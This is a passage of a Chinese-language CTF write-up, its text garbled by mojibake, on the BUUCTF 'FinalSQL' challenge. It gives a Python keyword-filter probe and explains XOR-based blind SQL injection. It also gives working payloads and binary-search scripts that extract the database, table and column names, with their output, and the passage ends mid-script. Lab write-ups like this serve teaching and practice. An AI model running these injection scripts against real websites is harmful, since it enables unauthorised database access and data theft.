class="hljs-string">&quot;http://3f8893c2-6eda-4113-bcfa-2b6188684bd7.node4.buuoj.cn:81/search.php?id=&quot;</span><br><span class="hljs-comment"># GETè¯·æ±‚</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    r = requests.get(url+data)<br>    <span class="hljs-comment"># ä½¿ç”¨timeä½¿è¯·æ±‚èƒ½å¤Ÿæ‹¥æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å“åº”</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># è·å–è¿‡æ»¤ç½‘ç«™å“åº”ä¿¡æ¯</span><br>    reponse_txt = <span class="hljs-string">&quot;è‡­å¼Ÿå¼Ÿ&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POSTè¯·æ±‚</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;&quot;: d</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     reponse_txt = &quot;è‡­å¼Ÿå¼Ÿ&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;.format(data))</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¯¥ç½‘ç«™è¿‡æ»¤äº†length Length<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†handler<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†likeLiKe<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†having<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†limitLimIt<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†insertinsERTINSERT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†!<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†%<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ANDANd<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†BYBy<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†unionUNIonUNION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†||<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†//*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†*/*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†/**/<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†anandd<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†HAVING<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†IF<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†INTO<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†LIKE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†|<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†UNION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†AND<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†drop<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†DROP<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†rand()<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†LIMIT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†by<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†OUTFILE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†VARCHAR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†/*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†mid<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†RLIKE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†sys schemma<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†%0c<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†@<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†else%27%23%22%20<br></code></pre></td></tr></table></figure><p>6.å‘ç°andè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹ç›²æ³¨ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¼‚æˆ–ç›²æ³¨:<br>id=1^0(false)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=1^1(true)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br><br>ç©ºå­—ç¬¦æˆ–ç›²æ³¨:<br>id=&#x27;&#x27; or é0(true)=&gt;1<br>è¿”å›id=1çš„ç•Œé¢<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>è¿”å›id=0çš„ç•Œé¢<br></code></pre></td></tr></table></figure><p>æµ‹è¯•:</p><p>è¿”å›id&#x3D;1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140656279.png" alt="image-20230828140656279"></p><p>è¿”å›id&#x3D;0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140743288.png" alt="image-20230828140743288"></p><p><strong>ä½¿ç”¨å¼‚æˆ–ç›²æ³¨æ„é€ payload,ç”±äºè¿‡æ»¤äº†limit,æ‰€ä»¥ä¸èƒ½ç”¨æ™®é€šçš„payload:</strong></p><p>ç¬¬ä¸€æ­¥ï¼šçˆ†æ•°æ®åº“åå­—çš„é•¿åº¦,ç”±äºlengthè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡å–æš´åŠ›ç ´è§£ï¼ˆè§„å®šæŸ¥æ‰¾é•¿åº¦ä¸º30ï¼‰</p><p>ç¬¬äºŒæ­¥ï¼šçˆ†æ•°æ®åº“çš„åå­—</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br>headers = &#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;</span>,<br>           <span class="hljs-string">&#x27;Referer&#x27;</span>:<span class="hljs-string">&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br>           &#125;<br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81//search.php?id=&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># å¯¹æ•°æ®åº“åå­—ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œæš´åŠ›å‰–è§£</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># æ‰‹åŠ¨è§„å®šæ•°æ®åº“åå­—é•¿åº¦</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>        <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        payload2 = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.get(url + payload2, )<br>        <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>        true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>    <span class="hljs-built_in">print</span>(tmp)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„ç¬¬%dä¸ªå­—ç¬¦:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># å¯¹ä¸‹ä¸€ä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼š&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¯¥æ•°æ®åº“çš„åå­—ä¸ºï¼šgeek<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸‰æ­¥ï¼šç›´æ¥çˆ†è¡¨åï¼Œæ‰‹åŠ¨è§„å®šæ‰€æœ‰è¡¨åæ€»é•¿50:</p><p><strong>ç”±äºlimitè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥ç”¨GROUP_CONCAT()è·å–æ‰€æœ‰è¡¨å</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><span class="hljs-comment"># table_lenå­˜å‚¨æ¯å¼ è¡¨çš„é•¿åº¦</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = []<br><span class="hljs-comment"># indexå­˜å‚¨ç°åœ¨å¤„ç†çš„æ˜¯ç¬¬index+1å¼ è¡¨</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># ç”±äºè·å–çš„æ˜¯æ‰€æœ‰è¡¨åæ€»å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åªè¦éå†ä¸€æ¬¡å³å¯</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># nè¡¨ç¤ºå½“å‰å¤„ç†çš„è¡¨æ‰€å¤„ç†çš„æ˜¯ç¬¬nä¸ªå­—ç¬¦</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>            <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># æ„é€ urlè¯·æ±‚,å¹¶å­˜å‚¨è¿”å›çš„ç½‘é¡µå“åº”ç»“æœ</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # ç”¨äºè¡¥å…¨ç½‘é¡µçš„url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            <span class="hljs-comment"># åˆ¤æ–­è¯¥payloadæ‰€è¿”å›çš„ç½‘é¡µæ˜¯trueç•Œé¢è¿˜æ˜¯falseç•Œé¢</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># è¿”å›trueç•Œé¢ </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># è¿”å›flaseç•Œé¢</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># æœ€ç»ˆbegin==end,è€Œæ­¤æ—¶çš„tmpå°±æ˜¯è¯¥å­—ç¬¦çš„asciiç </span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªå­—ç¬¦</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># å­˜å‚¨è¯¥è¡¨çš„è¡¨å</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># æ‰“å°è¯¥è¡¨çš„è¡¨å</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç¬¬&#123;&#125;å¼ è¡¨çš„åå­—ä¸º&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># ç»§ç»­ä¸‹ä¸€ä¸ªè¡¨</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç¬¬1å¼ è¡¨çš„åå­—ä¸ºF1naI1y,<br>[&#x27;F1naI1y,                      &#x27;]<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¾—åˆ°åªæœ‰è¡¨:F1naI1y</p><p>ç¬¬å››æ­¥ï¼šç›´æ¥çˆ†è¡¨çš„å­—æ®µå,æ‰‹åŠ¨è§„å®šå­—æ®µåæ€»é•¿50ï¼Œä½¿ç”¨GROUP_CONCAT()å°†è¯¥å¼ è¡¨çš„æ‰€æœ‰å­—æ®µåç»„åˆåœ¨ä¸€èµ·</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># urlæ˜¯éšæ—¶æ›´æ–°çš„ï¼Œå…·ä½“çš„ä»¥åšé¢˜æ—¶å€™çš„ä¸ºå‡†</span><br><br><span class="hljs-comment"># ç™»å½•dvwaçš„header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># å½“å‰æ³¨å…¥ç‚¹çš„urlä¼ è¾“æ ¼å¼:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_numå­˜å‚¨æ¯å¼ è¡¨æ¯ä¸ªå­—æ®µæ‰€å¯¹åº”çš„é•¿åº¦</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;F1naI1yç¬¬1å­—æ®µçš„é•¿åº¦&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_nameå­˜å‚¨æ¯å¼ è¡¨çš„åå­—</span><br>table_name = [<span class="hljs-string">&#x27;F1naI1y&#x27;</span>]<br><span class="hljs-comment"># col_countå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µæ•°</span><br><span class="hljs-comment"># å°†æ‰€æœ‰å­—æ®µåˆåœ¨ä¸€èµ·è¾“å‡ºå°±æ˜¯åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>col_count = &#123;<span class="hljs-string">&#x27;F1naI1y&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_nameå­˜å‚¨æ¯å¼ è¡¨çš„å­—æ®µçš„åå­—</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># å…ˆå¯¹è¡¨è¿›è¡Œéå†,åªæœ‰è¡¨F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># å½“å‰è¡¨çš„åå­—:table_name[table_index]</span><br>    <span class="hljs-comment"># col_numå­˜å‚¨å½“å‰è¡¨çš„å­—æ®µæ•°</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># å¯¹å½“å‰è¡¨çš„å­—æ®µè¿›è¡Œéå†ï¼Œè·å–å…¨éƒ¨å­—æ®µåï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ªå­—æ®µ</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_keyå­˜å‚¨å½“å‰è¡¨å½“å‰å­—æ®µçš„key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;ç¬¬&#123;&#125;å­—æ®µçš„é•¿åº¦&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_lenå­˜å‚¨å½“å‰å­—æ®µçš„é•¿åº¦</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># éå†å½“å‰å­—æ®µ</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># nameå­˜å‚¨å½“å‰å­—æ®µçš„åç§°</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># ç”¨äºŒåˆ†æ³•å¯¹å½“å‰å­—æ®µè¿›è¡ŒçŒœè§£</span><br>            <span class="hljs-comment"># ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># å¯¹ç¬¬nä¸ªå­—ç¬¦è¿›è¡Œåˆ¤æ–­</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># æ ¹æ®å½“å‰ç½‘é¡µurlä¼ è¾“æ ¼å¼æ„é€ payload</span><br>                <span class="hljs-comment"># payload1:ç”¨äºæ™®é€šç›²æ³¨</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span 